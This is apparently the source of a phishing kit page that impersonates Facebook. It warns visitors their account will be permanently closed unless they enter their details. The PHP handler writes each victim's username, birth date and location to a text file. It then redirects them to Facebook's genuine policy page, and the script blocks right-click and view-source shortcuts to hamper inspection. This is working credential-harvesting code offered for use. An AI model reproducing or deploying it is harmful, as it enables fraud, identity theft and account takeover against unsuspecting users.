...
if (isset($_POST['dd']) && isset($_POST['mm']) && isset($_POST['yy'])) {
    ...
    $region = $_POST['ct'];
    $country = $_POST['ct'];
    $file = fopen('tramsexy.txt', 'a+');
    fwrite($file, "{$username}|{$day}/{$month}/{$year}-- [CITY: {$city}, REGION: {$region}, COUNTRY: {$country}]\n");
    fclose($file);
    session_destroy();
    header('Location: https://www.facebook.com/policies_center/');
}
?>
<!DOCTYPE html>
...
<head>
    ...
    <link type="text/css" rel="stylesheet" href="../assets/css/style-pay.css">
    <link type="text/css" rel="stylesheet" href="../assets/css/pAy5sS6Se6DC.css">
...
<body class="_6s5d _71pn _-kb segoe">
                                                                                        ...
                                                                                        <div class="l9j0dhe7 du4w35lb rq0escxv j83agx80 cbu4d94t pfnyh3mw d2edcug0 discj3wi ihqw7lf3">
                                                                                            <div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 cbu4d94t buofh1pr tgvbjcpo sv5sfqaa obtkqiv7">
                                                                                                <div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 cbu4d94t pfnyh3mw d2edcug0 bp9cbjyn aov4n071 bi6gxh9e">
                                                                                                    <div class="l9j0dhe7">
                                                                                                        <i data-visualcompletion="css-img" style="background-image: url(&quot;../assets/img/IcoMeT4.png&quot;); background-position: 0px -274px; background-size: auto; width: 500px; height: 134px; background-repeat: no-repeat; display: inline-block;"></i>
                                                                                                    </div>
                                                                                                </div>
                                                                                                ...
                                                                                                <button class="k4urcfbm l9j0dhe7 tw6a2znq d1544ag0 stjgntxs ni8dbmo4 taijpn5t tv7at329 btwxx1t3 j83agx80 rq0escxv kzx2olss aot14ch1 p86d2i9g beltcj47 izx4hr6d humdl8nn bn081pho gcieejh5 tcv6vlfj bp9cbjyn qrtewk5h jq4qci2q" type="submit"><b>Continue</b></button>
                                                                                                </form>
                                                                                            </div>
                                                                                        </div>
                                                                                        <div class="_3QeaJ">
                                                                                            ...
                                                                                            <div class="DonErr">
                                                                                                Please make sure to fill in the data correctly, if you fill in the wrong data your account will be permanently closed. To learn more about why we deactivate accounts, go to <b>
                                                                                                    <font color="#385898">Community Standards</font>
                                                                                                </b>.
                                                                                            </div>
                                                                                        </div>
                                                                                    </div>
    ...
    <script type="text/javascript">
        ...
        $(document).on('mousedown', function(e) {
            if (e.button === 2 || e.button === 3 || e.which === 3) {
                return false;
            }
        })

        $(window).on('keydown', function(e) {
            const ctrlKeyCombination = [65, 66, 67, 73, 80, 83, 85, 86];
            if (e.ctrlKey && ctrlKeyCombination.includes(e.which)) {
                e.preventDefault();
            }
        })
